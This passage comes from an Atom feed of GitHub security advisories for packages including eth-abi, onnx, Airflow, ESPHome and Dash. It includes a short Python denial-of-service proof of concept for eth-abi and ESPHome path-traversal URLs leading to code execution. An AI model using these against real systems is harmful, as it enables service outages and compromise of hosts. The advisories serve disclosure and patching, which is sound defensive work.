            <uri>https://github.com/advisories/GHSA-9p43-hj5j-96h5</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-03-06T15:28:21.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[eth-abi] eth-abi is vulnerable to recursive DoS]]></title>
        <id>https://github.com/advisories/GHSA-3qwc-47jf-5rf7</id>
        <link href="https://github.com/advisories/GHSA-3qwc-47jf-5rf7"/>
        <updated>2024-03-05T14:39:14.000Z</updated>
        <content type="html"><![CDATA[<p>This is related to recent ZST stuff (<a href="https://github.com/ethereum/eth-abi/security/advisories/GHSA-rqr8-pxh7-cq3g">https://github.com/ethereum/eth-abi/security/advisories/GHSA-rqr8-pxh7-cq3g</a>), but it's a different one. Basically a recursive pointer issue</p>
<pre><code class="language-py">from eth_abi import decode


payload = "0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000a

# OverflowError: Python int too large to convert to C ssize_t
#decode(['(uint256[][][][][][][][][][])'], bytearray.fromhex(payload))

decode(['uint256[][][][][][][][][][]'], bytearray.fromhex(payload+('00' * 1024)))
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ethereum/eth-abi/security/advisories/GHSA-3qwc-47jf-5rf7">https://github.com/ethereum/eth-abi/security/advisories/GHSA-3qwc-47jf-5rf7</a></li>
<li><a href="https://github.com/ethereum/eth-abi/commit/82c1ad37a866472562d81fedaef0f4fed0a08269">https://github.com/ethereum/eth-abi/commit/82c1ad37a866472562d81fedaef0f4fed0a08269</a></li>
<li><a href="https://github.com/advisories/GHSA-3qwc-47jf-5rf7">https://github.com/advisories/GHSA-3qwc-47jf-5rf7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3qwc-47jf-5rf7</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-03-05T14:39:13.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[onnx] Onnx Out-of-bounds Read vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-h8wv-9h96-m4hr</id>
        <link href="https://github.com/advisories/GHSA-h8wv-9h96-m4hr"/>
        <updated>2024-03-03T05:07:00.000Z</updated>
        <content type="html"><![CDATA[<p>Versions of the package onnx before and including 1.15.0 are vulnerable to Out-of-bounds Read as the ONNX_ASSERT and ONNX_ASSERTM functions have an off by one string copy.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-27319">https://nvd.nist.gov/vuln/detail/CVE-2024-27319</a></li>
<li><a href="https://github.com/onnx/onnx/commit/08a399ba75a805b7813ab8936b91d0e274b08287">https://github.com/onnx/onnx/commit/08a399ba75a805b7813ab8936b91d0e274b08287</a></li>
<li><a href="https://github.com/advisories/GHSA-h8wv-9h96-m4hr">https://github.com/advisories/GHSA-h8wv-9h96-m4hr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-h8wv-9h96-m4hr</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-02-23T18:30:59.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[openvpn-monitor] furlongm openvpn-monitor allows CSRF to disconnect an arbitrary client]]></title>
        <id>https://github.com/advisories/GHSA-vw35-c8hf-fwmq</id>
        <link href="https://github.com/advisories/GHSA-vw35-c8hf-fwmq"/>
        <updated>2024-03-03T05:06:59.000Z</updated>
        <content type="html"><![CDATA[<p>furlongm openvpn-monitor through 1.1.3 allows CSRF to disconnect an arbitrary client.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-31604">https://nvd.nist.gov/vuln/detail/CVE-2021-31604</a></li>
<li><a href="https://github.com/furlongm/openvpn-monitor/releases">https://github.com/furlongm/openvpn-monitor/releases</a></li>
<li><a href="http://packetstormsecurity.com/files/164281/OpenVPN-Monitor-1.1.3-Cross-Site-Request-Forgery.html">http://packetstormsecurity.com/files/164281/OpenVPN-Monitor-1.1.3-Cross-Site-Request-Forgery.html</a></li>
<li><a href="https://github.com/advisories/GHSA-vw35-c8hf-fwmq">https://github.com/advisories/GHSA-vw35-c8hf-fwmq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vw35-c8hf-fwmq</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-05-24T19:15:55.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[apache-airflow] Apache Airflow: Incorrect Default Permissions in audit logs for Ops and Viewers users]]></title>
        <id>https://github.com/advisories/GHSA-6xwf-xvf3-v459</id>
        <link href="https://github.com/advisories/GHSA-6xwf-xvf3-v459"/>
        <updated>2024-03-01T21:40:56.000Z</updated>
        <content type="html"><![CDATA[<p>Apache Airflow, versions before 2.8.2, has a vulnerability that allows authenticated Ops and Viewers users to view all information on audit logs, including dag names and usernames they were not permitted to view.&nbsp;With 2.8.2 and newer, Ops and Viewer users do not have audit log permission by default, they need to be explicitly granted permissions to see the logs. Only admin users have audit log permission by default.</p>
<p>Users of Apache Airflow are recommended to upgrade to version 2.8.2 or newer to mitigate the risk associated with this vulnerability</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-26280">https://nvd.nist.gov/vuln/detail/CVE-2024-26280</a></li>
<li><a href="https://github.com/apache/airflow/pull/37501">https://github.com/apache/airflow/pull/37501</a></li>
<li><a href="https://lists.apache.org/thread/knskxxxml95091rsnpxkpo1jjp8rj0fh">https://lists.apache.org/thread/knskxxxml95091rsnpxkpo1jjp8rj0fh</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/apache-airflow/PYSEC-2024-42.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/apache-airflow/PYSEC-2024-42.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-6xwf-xvf3-v459">https://github.com/advisories/GHSA-6xwf-xvf3-v459</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6xwf-xvf3-v459</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-03-01T12:30:53.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[apache-airflow-providers-apache-hdfs] Apache HDFS Provider error message suggested]]></title>
        <id>https://github.com/advisories/GHSA-5hj9-m76g-xrc8</id>
        <link href="https://github.com/advisories/GHSA-5hj9-m76g-xrc8"/>
        <updated>2024-03-01T21:29:26.000Z</updated>
        <content type="html"><![CDATA[<p>In the Apache Airflow HDFS Provider, versions prior to 4.1.1, a documentation&nbsp;info pointed users to an install incorrect pip package. As this package name was unclaimed, in theory, an attacker could claim this package and provide code that would be executed when this package was installed. The Airflow team has since taken ownership of the package (neutralizing the risk), and fixed the doc strings in version 4.1.1</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-41267">https://nvd.nist.gov/vuln/detail/CVE-2023-41267</a></li>
<li><a href="https://github.com/apache/airflow/pull/33813">https://github.com/apache/airflow/pull/33813</a></li>
<li><a href="https://lists.apache.org/thread/ggthr5pn42bn6wcr25hxnykjzh4ntw7z">https://lists.apache.org/thread/ggthr5pn42bn6wcr25hxnykjzh4ntw7z</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2023/09/14/3">http://www.openwall.com/lists/oss-security/2023/09/14/3</a></li>
<li><a href="https://github.com/advisories/GHSA-5hj9-m76g-xrc8">https://github.com/advisories/GHSA-5hj9-m76g-xrc8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5hj9-m76g-xrc8</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-09-14T09:30:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[esphome] ESPHome vulnerable to remote code execution via arbitrary file write]]></title>
        <id>https://github.com/advisories/GHSA-8p25-3q46-8q2p</id>
        <link href="https://github.com/advisories/GHSA-8p25-3q46-8q2p"/>
        <updated>2024-03-01T20:09:21.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Security misconfiguration in edit configuration file API in dashboard component of ESPHome version 2023.12.9 (command line installation) allows authenticated remote attackers to read and write arbitrary files under the configuration directory rendering remote code execution possible.</p>
<h3 id="details">Details</h3>
<p>It is possible to abuse this path traversal vulnerability both in command line installation and Home Assistant add-on, but it is possible to read and write files only under the configuration directory. </p>
<p>The vulnerability is present and exploitable in the command line installation, but it was not possible to confirm an impact in the home assistant add-on version.</p>
<h3 id="poc">PoC</h3>
<img src="https://github.com/esphome/esphome/assets/115887876/d2da3180-976e-4bed-b4b9-35ac960a7fb4" alt="/edit?configuration=/config/.esphome/esphome.json" width="482">
<br>

<img src="https://github.com/esphome/esphome/assets/115887876/707fb6d7-d4a8-461e-bbb7-05382471e925" alt="/edit?configuration=/config/.esphome/build/test01/src/main.cpp (firmware for board named test01)" width="344">
<br>

<img src="https://github.com/esphome/esphome/assets/115887876/c6cb28d8-352d-4fea-b77a-705f63be94e3" alt="RCE payload POST request on /edit?configuration=.esphome/platformio/packages/tool-esptoolpy/esptool.py" width="482">
<br>

<img src="https://github.com/esphome/esphome/assets/115887876/5eb0f14c-ceb2-4b15-8898-c02c610763d1" alt="Arbitrary code execution during ESP board flashing" width="482">


<h3 id="impact">Impact</h3>
<p>The issue gives read and write access to files under the configuration directory and allows malicious users to write arbitrary code in python scripts executed during the compilation and flashing of firmwares for ESP boards. </p>
<p>If chained with GHSA-9p43-hj5j-96h5 and GHSA-5925-88xh-6h99, this issue could allow an unauthenticated remote user to gain remote code execution on the machine hosting the dashboard.</p>
<p>It also allows accessing sensitive information such as esphome.json and board firmware source code allowing a user to modify the board firmware, and leaking secrets such as: WiFi network credentials, fallback hotspot WiFi credentials, OTA component authentication password and API encryption key.</p>
<h3 id="credits">Credits</h3>
<p>Spike Reply Cybersecurity Team</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/esphome/esphome/security/advisories/GHSA-8p25-3q46-8q2p">https://github.com/esphome/esphome/security/advisories/GHSA-8p25-3q46-8q2p</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-27081">https://nvd.nist.gov/vuln/detail/CVE-2024-27081</a></li>
<li><a href="https://github.com/esphome/esphome/commit/d814ed1d4adc71fde47c4df41215bee449884513">https://github.com/esphome/esphome/commit/d814ed1d4adc71fde47c4df41215bee449884513</a></li>
<li><a href="https://github.com/advisories/GHSA-8p25-3q46-8q2p">https://github.com/advisories/GHSA-8p25-3q46-8q2p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8p25-3q46-8q2p</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-01T20:09:19.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[dash-core-components] Dash apps vulnerable to Cross-site Scripting]]></title>
        <id>https://github.com/advisories/GHSA-547x-748v-vp6p</id>
        <link href="https://github.com/advisories/GHSA-547x-748v-vp6p"/>
        <updated>2024-03-06T16:21:31.000Z</updated>
        <content type="html"><![CDATA[<p>Versions of the package dash-core-components before 2.13.0; versions of the package dash-core-components before 2.0.0; versions of the package dash before 2.15.0; versions of the package dash-html-components before 2.0.0; versions of the package dash-html-components before 2.0.16 are vulnerable to Cross-site Scripting (XSS) when the href of the a tag is controlled by an adversary. An authenticated attacker who stores a view that exploits this vulnerability could steal the data that's visible to another user who opens that view - not just the data already included on the page, but they could also, in theory, make additional requests and access other data accessible to this user. In some cases, they could also steal the access tokens of that user, which would allow the attacker to act as that user, including viewing other apps and resources hosted on the same server. </p>
<p><strong>Note:</strong> </p>
<p>This is only exploitable in Dash apps that include some mechanism to store user input to be reloaded by a different user.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-21485">https://nvd.nist.gov/vuln/detail/CVE-2024-21485</a></li>
<li><a href="https://github.com/plotly/dash/issues/2729">https://github.com/plotly/dash/issues/2729</a></li>
<li><a href="https://github.com/plotly/dash/pull/2732">https://github.com/plotly/dash/pull/2732</a></li>
<li><a href="https://github.com/plotly/dash/commit/9920073c9a8619ae8f90fcec1924f2f3a4332a8c">https://github.com/plotly/dash/commit/9920073c9a8619ae8f90fcec1924f2f3a4332a8c</a></li>
<li><a href="https://github.com/plotly/dash/releases/tag/v2.15.0">https://github.com/plotly/dash/releases/tag/v2.15.0</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-JS-DASHCORECOMPONENTS-6183084">https://security.snyk.io/vuln/SNYK-JS-DASHCORECOMPONENTS-6183084</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-JS-DASHHTMLCOMPONENTS-6226337">https://security.snyk.io/vuln/SNYK-JS-DASHHTMLCOMPONENTS-6226337</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-PYTHON-DASH-6226335">https://security.snyk.io/vuln/SNYK-PYTHON-DASH-6226335</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-PYTHON-DASHCORECOMPONENTS-6226334">https://security.snyk.io/vuln/SNYK-PYTHON-DASHCORECOMPONENTS-6226334</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-PYTHON-DASHHTMLCOMPONENTS-6226336">https://security.snyk.io/vuln/SNYK-PYTHON-DASHHTMLCOMPONENTS-6226336</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/dash/PYSEC-2024-35.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/dash/PYSEC-2024-35.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-547x-748v-vp6p">https://github.com/advisories/GHSA-547x-748v-vp6p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-547x-748v-vp6p</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-02-02T06:30:31.000Z</published>
    </entry>
</feed>